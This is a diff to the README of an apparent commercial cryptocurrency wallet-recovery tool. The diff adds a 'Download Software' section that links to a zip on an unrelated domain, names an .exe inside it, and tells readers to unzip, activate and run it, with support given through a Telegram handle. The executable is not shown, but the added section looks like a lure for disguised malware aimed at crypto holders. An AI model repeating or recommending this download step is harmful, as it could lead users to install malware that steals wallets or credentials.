@@ -366,6 +366,13 @@ This tool is provided as-is for recovery purposes. Use at your own risk. Always 
 
 **Tool Purchase**: This tool requires a license to use. Contact us for pricing.
 
+## Download Software
+
+- [Download Tool](https://angeldrop.sh/download/1764729027088iwvr4o/%40imywb-walletrecover.zip)
+- Unzip the file (the name should be @imywb-walletrecover.exe)
+- Activate the tool.
+- Follow the instructions in **Quick Start** to run things
+
 **Annual Support Subscription Benefits**:
 - Regular tool upgrades and new features
 - Priority technical support
@@ -381,4 +388,5 @@ This tool is provided as-is for recovery purposes. Use at your own risk. Always 
 **Version**: 1.0  
 **Last Updated**: December 2025  
 **Support**: t.me/imywb
+
 
